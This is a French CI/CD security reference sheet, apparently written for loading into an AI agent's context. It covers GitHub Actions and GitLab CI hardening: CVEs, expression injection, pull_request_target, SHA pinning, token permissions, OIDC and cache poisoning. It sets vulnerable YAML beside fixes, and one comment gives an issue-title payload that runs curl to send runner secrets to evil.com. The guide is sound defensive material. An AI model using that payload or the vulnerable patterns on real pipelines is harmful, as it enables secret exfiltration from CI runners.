# Infra CI/CD — Security Patterns
> Tags: github-actions, gitlab, ci-cd, pipeline, supply-chain
> Load when: project uses GitHub Actions, GitLab CI, or any CI/CD pipeline

## CVEs Critiques

| CVE | CVSS | Service | Impact | Fix |
|-----|------|---------|--------|-----|
| CVE-2025-30066 | 8.6 | tj-actions/changed-files | Tags modifiés rétro → dump mémoire runner → AWS keys, PATs, tokens RSA dans logs (23 000+ repos, mars 2025) | PIN sur SHA, auditer tous les tags |
| CVE-2025-30154 | — | reviewdog | Compromis via invitation automatique → leak PAT → chaîne vers tj-actions | PIN sur SHA |
| CVE-2025-53104 | 9.1 | GitHub Actions | Expression injection → RCE via données event non sanitisées | Var d'env intermédiaire |
| CVE-2025-61671 | 9.3 | GitHub Actions | Expression injection avancée → exfiltration secrets runner | Var d'env intermédiaire |

## Failles Spécifiques

### Expression Injection GitHub Actions (RCE)

```yaml
# VULN — titre d'issue injecté directement dans run
- run: echo "New issue: ${{ github.event.issue.title }}"
# Attaque : titre = "; curl evil.com/steal?t=$(env|base64) #"
# → exfiltre tous les secrets du runner

# FIX — variable d'env intermédiaire (pas d'interpolation shell)
- env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "New issue: $ISSUE_TITLE"
```

Toutes les expressions `${{ github.event.* }}`, `${{ github.head_ref }}`, `${{ inputs.* }}` sont potentiellement dangereuses dans `run:`.

### pull_request_target — Fork code + secrets

```yaml
# VULN — exécute le code du fork avec les secrets du repo cible
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # code fork !
  - run: npm test
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}

# FIX — séparer build (sans secrets) et deploy (sans checkout fork)
# Workflow 1 : build
on: pull_request
steps:
  - uses: actions/checkout@v4
  - run: npm test
  - uses: actions/upload-artifact@v4
    with: {name: build-output, path: dist/}
# Workflow 2 : deploy (déclenché par workflow_run, ne checkout JAMAIS le fork)
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
```

### SHA Pinning des actions (anti-supply-chain)

```yaml
# VULN — tag mutable, peut être rétroactivement compromis
- uses: tj-actions/changed-files@v45

# FIX — SHA immuable + commentaire version
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020  # v4.4.0
```

Seulement 3,9% des repos pinnent sur SHA. Outil : `pin-github-action` ou `renovate` pour mises à jour automatiques.

### GITHUB_TOKEN — sur-permission

```yaml
# VULN — token hérite de toutes les permissions par défaut
jobs:
  build:
    runs-on: ubuntu-latest

# FIX — deny-all au niveau workflow, grant minimal par job
permissions: {}
jobs:
  build:
    permissions:
      contents: read
    runs-on: ubuntu-latest
  deploy:
    permissions:
      id-token: write  # OIDC uniquement
      contents: read
```

### OIDC — remplace credentials longue durée

```yaml
# FIX — OIDC : credentials éphémères, pas de secrets AWS stockés
permissions:
  id-token: write
  contents: read

steps:
- uses: aws-actions/configure-aws-credentials@e3dd6a429e9ad8e35f167b2e3c6fc1b33d3d9c2  # SHA
  with:
    role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
    aws-region: eu-west-1
```

Trust policy AWS : `"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"`.

### GitLab CI — Cache Poisoning Cross-Branch

```yaml
# VULN — cache partagé entre toutes les branches
cache:
  key: "build-cache"
  paths: [node_modules/]

# FIX — clé unique par job + variable protégée + read-only pour MRs
cache:
  key: "${CI_JOB_NAME}-${CACHE_SECRET}"  # CACHE_SECRET = variable protégée GitLab
  policy: pull  # MRs ne peuvent qu'utiliser, pas écrire
  paths: [node_modules/]
```

### Self-hosted runners + SLSA

```yaml
# VULN — runner partagé entre repos, reste connecté après le job
runs-on: self-hosted

# FIX — runner éphémère par job (GitHub ARC)
runs-on: [self-hosted, ephemeral, linux]

# SLSA Level 3 — attestation de provenance build
- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2
  with:
    base64-subjects: ${{ needs.build.outputs.hashes }}
```

## Hardening Checklist

- [ ] Toutes les actions pinnées sur SHA (pas sur tag ou branch)
- [ ] `permissions: {}` au niveau workflow, grants minimaux par job
- [ ] Aucune expression `${{ github.event.* }}` directement dans `run:` → var d'env intermédiaire
- [ ] `pull_request_target` : jamais checkout du fork avec secrets
- [ ] OIDC pour AWS/GCP/Azure — aucune credential longue durée dans les secrets GitHub
- [ ] Self-hosted runners : éphémères, réseau isolé, pas de secrets persistants
- [ ] GitLab : `CACHE_SECRET` variable protégée + `policy: pull` pour MRs
- [ ] Auditer les dépendances d'actions : `scorecard`, `step-security/harden-runner`
- [ ] SLSA Level 2+ pour les artefacts publiés
- [ ] Alertes GitHub Advanced Security sur les expression injections
- [ ] Rotation immédiate si runner compromis (tous les tokens exposés sont révoqués)
